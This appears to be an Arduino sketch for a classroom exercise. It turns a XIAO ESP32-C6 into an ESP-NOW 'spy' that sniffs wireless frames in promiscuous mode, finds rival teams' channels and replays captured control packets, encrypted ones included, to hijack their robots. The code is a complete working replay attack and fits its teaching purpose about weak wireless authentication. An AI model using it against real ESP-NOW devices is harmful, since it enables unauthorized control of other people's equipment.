// espiao_monitor_xiao_term.ino - ESPIAO em MODO MONITOR num XIAO ESP32-C6,
// controlado PELO TERMINAL (Serial 115200).
//
// Captura todo frame ESP-NOW do canal (broadcast ou unicast, para QUALQUER destino),
// guarda um historico numerado e deixa o aluno escolher, pelo terminal, QUAL pacote
// repetir. O replay e VERBATIM (reenvia os bytes exatos) e vai para o MESMO destino do
// pacote original: funciona em texto claro, em unicast e tambem contra a cifra - o
// espiao nao entende, mas repete. Nao precisa saber o MAC do robo: ele aparece na captura.
//
// Corrida (varias equipes, uma por canal 1/6/11): o espiao ataca os RIVAIS.
// Primeiro descubra em que canal eles estao (v = varredura), depois mude (k <n>).
//
// Comandos (digite e tecle Enter):
//   l        lista o historico
//   <n>      repete o pacote numero n           ex.: 7
//   <n> xK   repete o pacote n, K vezes          ex.: 7 x3
//   u        repete o ultimo pacote capturado
//   m        liga/desliga a impressao ao vivo das capturas (o historico continua)
//   c        limpa o historico
//   v        varre os canais 1-13 e conta pacotes ESP-NOW em cada um
//   k <n>    muda para o canal n (fica gravado: vale apos reiniciar)  ex.: k 6
//   h        ajuda
// Botao BOOT = repete o ultimo pacote (atalho fisico).
//
// Terminal:
//   arduino-cli monitor -p <porta> -c baudrate=115200
//
// Gravar:
//   arduino-cli compile --fqbn esp32:esp32:XIAO_ESP32C6 arduino/espiao_monitor_xiao_term
//   arduino-cli upload  -p <porta> --fqbn esp32:esp32:XIAO_ESP32C6 arduino/espiao_monitor_xiao_term

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_now.h"
#include <Preferences.h>

// ====================== CONFIGURACAO ======================
static const uint8_t CANAL_PADRAO = 1;        // canal na 1a vez; depois vale o gravado (k <n>)
static const int     VARRE_MS = 700;          // tempo ouvindo cada canal na varredura

#ifndef LED_BUILTIN
#define LED_BUILTIN 15
#endif
#define PINO_LED        LED_BUILTIN           // XIAO C6: GPIO15, ativo em BAIXO
#define LED_ATIVO_BAIXO 1
#define PINO_BOTAO      9                     // BOOT
#define BODY_MAX        32
#define HIST_N          40                    // quantos pacotes o historico guarda
// ==========================================================

static const uint8_t BROADCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

struct Cap {
  uint8_t  src[6];
  uint8_t  dst[6];
  uint8_t  body[BODY_MAX];
  uint8_t  len;
  bool     bcast;
  int8_t   rssi;
  uint32_t ms;
  long     id;
};

// Fila preenchida pelo callback do Wi-Fi (contexto de interrupcao) e esvaziada no loop.
#define QN 16
static volatile uint8_t q_head = 0, q_tail = 0;
static Cap q[QN];

// Historico circular numerado (id cresce sempre; os mais antigos saem).
static Cap  hist[HIST_N];
static long total = 0;                        // id do ultimo pacote guardado
static long base  = 1;                        // menor id ainda disponivel (apos "c")
static bool ao_vivo = true;
static uint8_t canal = CANAL_PADRAO;
static volatile bool varrendo = false;        // na varredura so conta, nao guarda
static volatile uint32_t conta_varre = 0;
static Preferences prefs;

// ------------------------------------------------------------------ util
static void ledSet(bool on) {
#if LED_ATIVO_BAIXO
  digitalWrite(PINO_LED, on ? LOW : HIGH);
#else
  digitalWrite(PINO_LED, on ? HIGH : LOW);
#endif
}
static void ledPisca(int vezes, int ms) {
  for (int i = 0; i < vezes; i++) { ledSet(true); delay(ms); ledSet(false); delay(ms); }
}

static void macStr(const uint8_t* m, char* out) {
  sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static const char* nomeComando(const Cap& c) {
  if (c.len == 1) {
    switch (c.body[0]) {
      case 'F': return "FORWARD";
      case 'T': return "BACK";
      case 'E': return "LEFT";
      case 'D': return "RIGHT";
      case 'P': return "STOP";
    }
  }
  return "? (unreadable)";                      // ex.: cifrado
}

static void imprimeCap(const Cap& c) {
  char mac[18]; macStr(c.src, mac);
  if (c.bcast) {
    Serial.printf("#%-3ld %7.1fs  BCAST                      from %s  %ddBm  %2dB  %-12s  ",
                  c.id, c.ms / 1000.0, mac, c.rssi, c.len, nomeComando(c));
  } else {
    char dst[18]; macStr(c.dst, dst);
    Serial.printf("#%-3ld %7.1fs  UNI to %s  from %s  %ddBm  %2dB  %-12s  ",
                  c.id, c.ms / 1000.0, dst, mac, c.rssi, c.len, nomeComando(c));
  }
  for (int i = 0; i < c.len; i++) Serial.printf("%02x", c.body[i]);
  Serial.println();
}

static Cap* buscaId(long id) {
  if (id < base || id > total || id <= total - HIST_N) return nullptr;
  Cap* c = &hist[id % HIST_N];
  return (c->id == id) ? c : nullptr;
}

// ------------------------------------------------------------------ sniffer
static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 40) return;

  if (p[24] != 0x7F) return;                  // vendor-specific action
  if (p[32] != 0xDD) return;                  // element vendor-specific
  if (p[34] != 0x18 || p[35] != 0xFE || p[36] != 0x34) return;  // OUI Espressif
  if (p[37] != 0x04) return;                  // tipo ESP-NOW

  if (varrendo) { conta_varre++; return; }

  const uint8_t* da = p + 4;
  bool bcast = (memcmp(da, BROADCAST, 6) == 0);

  int bodylen = p[33] - 5;
  if (bodylen < 1) return;
  if (39 + bodylen > len) bodylen = len - 39;
  if (bodylen > BODY_MAX) bodylen = BODY_MAX;

  uint8_t next = (q_head + 1) % QN;
  if (next == q_tail) return;
  Cap& c = q[q_head];
  memcpy(c.src, p + 10, 6);
  memcpy(c.dst, da, 6);
  memcpy(c.body, p + 39, bodylen);
  c.len   = bodylen;
  c.bcast = bcast;
  c.rssi  = pkt->rx_ctrl.rssi;
  c.ms    = millis();
  q_head = next;
}

// ------------------------------------------------------------------ replay
// Registra o destino como peer (canal 0 = canal atual do radio), se ainda nao existe.
static void garantePeer(const uint8_t* mac) {
  if (esp_now_is_peer_exist(mac)) return;
  esp_now_peer_info_t peer = {};
  memcpy(peer.peer_addr, mac, 6);
  peer.channel = 0;
  peer.ifidx   = WIFI_IF_STA;
  peer.encrypt = false;
  esp_now_add_peer(&peer);
}

static void replay(long id, int vezes) {
  Cap* c = buscaId(id);
  if (!c) { Serial.printf("packet #%ld is not in the history (use l)\n", id); return; }
  char dst[18]; macStr(c->dst, dst);
  garantePeer(c->dst);
  for (int i = 0; i < vezes; i++) {
    esp_err_t r = esp_now_send(c->dst, c->body, c->len);
    Serial.printf("REPLAY #%ld -> %s  %s  (%s)\n", id, c->bcast ? "BROADCAST" : dst,
                  nomeComando(*c), r == ESP_OK ? "ok" : "failed");
    ledPisca(2, 40);
    if (i + 1 < vezes) delay(300);
  }
}

// ------------------------------------------------------------------ canais
static void mudaCanal(int n, bool gravar) {
  canal = n;
  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
  if (gravar) { prefs.putUChar("canal", canal); }
  Serial.printf("channel %d%s\n", canal, gravar ? " (saved)" : "");
}

static void varre() {
  uint8_t original = canal;
  Serial.println("scanning channels (ESP-NOW packets heard on each):");
  varrendo = true;
  for (int ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    conta_varre = 0;
    delay(VARRE_MS);
    uint32_t n = conta_varre;
    Serial.printf("  channel %2d: %3lu  ", ch, (unsigned long)n);
    for (uint32_t i = 0; i < n && i < 40; i++) Serial.print('#');
    Serial.println();
  }
  varrendo = false;
  esp_wifi_set_channel(original, WIFI_SECOND_CHAN_NONE);
  Serial.printf("back on channel %d (change with: k <n>)\n", original);
}

// ------------------------------------------------------------------ terminal
static void ajuda() {
  Serial.println("commands: l=list  <n>=replay #n  <n> xK=replay K times  u=last");
  Serial.println("          v=scan channels  k <n>=switch to channel n");
  Serial.println("          m=live on/off  c=clear  h=help   (BOOT = last)");
}

static void lista() {
  if (total < base) { Serial.println("(history empty)"); return; }
  long ini = total - HIST_N + 1;
  if (ini < base) ini = base;
  Serial.println("---- history ----------------------------------------------------------");
  for (long id = ini; id <= total; id++) { Cap* c = buscaId(id); if (c) imprimeCap(*c); }
  Serial.println("-----------------------------------------------------------------------");
}

static void executa(char* s) {
  while (*s == ' ') s++;
  if (*s == 0) return;
  char k = tolower(*s);
  if (k == 'l') { lista(); return; }
  if (k == 'h' || k == '?') { ajuda(); return; }
  if (k == 'u') { if (total >= base) replay(total, 1); else Serial.println("(nothing captured)"); return; }
  if (k == 'm') { ao_vivo = !ao_vivo; Serial.printf("live: %s\n", ao_vivo ? "on" : "off"); return; }
  if (k == 'c') { base = total + 1; Serial.println("history cleared"); return; }
  if (k == 'v') { varre(); return; }
  if (k == 'k') {
    int n = atoi(s + 1);
    if (n < 1 || n > 13) { Serial.println("channel 1 to 13, e.g.: k 6"); return; }
    mudaCanal(n, true);
    return;
  }
  if (*s == '#') s++;
  if (isdigit((unsigned char)*s)) {
    long id = strtol(s, &s, 10);
    int vezes = 1;
    char* x = strchr(s, 'x');
    if (x) { vezes = atoi(x + 1); if (vezes < 1) vezes = 1; if (vezes > 20) vezes = 20; }
    replay(id, vezes);
    return;
  }
  Serial.printf("unknown command: %s\n", s);
  ajuda();
}

static char linha[32];
static uint8_t nlinha = 0;

static void leTerminal() {
  while (Serial.available()) {
    char ch = Serial.read();
    if (ch == '\r' || ch == '\n') {
      if (nlinha) { Serial.println(); linha[nlinha] = 0; executa(linha); nlinha = 0; }
    } else if ((ch == 8 || ch == 127) && nlinha) {
      nlinha--; Serial.print("\b \b");
    } else if (ch >= 32 && nlinha < sizeof(linha) - 1) {
      linha[nlinha++] = ch;
      Serial.print(ch);                         // eco: o monitor nao mostra o que se digita
    }
  }
}

// ------------------------------------------------------------------ setup/loop
void setup() {
  pinMode(PINO_LED, OUTPUT); ledSet(false);
  pinMode(PINO_BOTAO, INPUT_PULLUP);
  Serial.begin(115200);
  delay(200);

  prefs.begin("espiao", false);
  canal = prefs.getUChar("canal", CANAL_PADRAO);
  if (canal < 1 || canal > 13) canal = CANAL_PADRAO;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);

  if (esp_now_init() == ESP_OK) garantePeer(BROADCAST);

  wifi_promiscuous_filter_t filtro = {};
  filtro.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filtro);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);

  Serial.println("========================================");
  Serial.println("SPY monitor (XIAO ESP32-C6) - terminal");
  Serial.printf("Channel %d  (replay goes to each packet's original destination)\n", canal);
  ajuda();
  Serial.println("========================================");
  ledPisca(2, 150);
}

static bool botao_ant = false;

void loop() {
  while (q_tail != q_head) {
    Cap c = q[q_tail];
    q_tail = (q_tail + 1) % QN;
    c.id = ++total;
    hist[c.id % HIST_N] = c;
    if (ao_vivo) {
      if (nlinha) Serial.println();             // nao embaralha com o que se digita
      imprimeCap(c);
      if (nlinha) { linha[nlinha] = 0; Serial.print(linha); }
    }
    ledPisca(1, 30);
  }

  leTerminal();

  bool pressionado = (digitalRead(PINO_BOTAO) == LOW);
  if (pressionado && !botao_ant) {
    delay(20);
    if (digitalRead(PINO_BOTAO) == LOW && total >= base) replay(total, 1);
  }
  botao_ant = pressionado;

  delay(5);
}
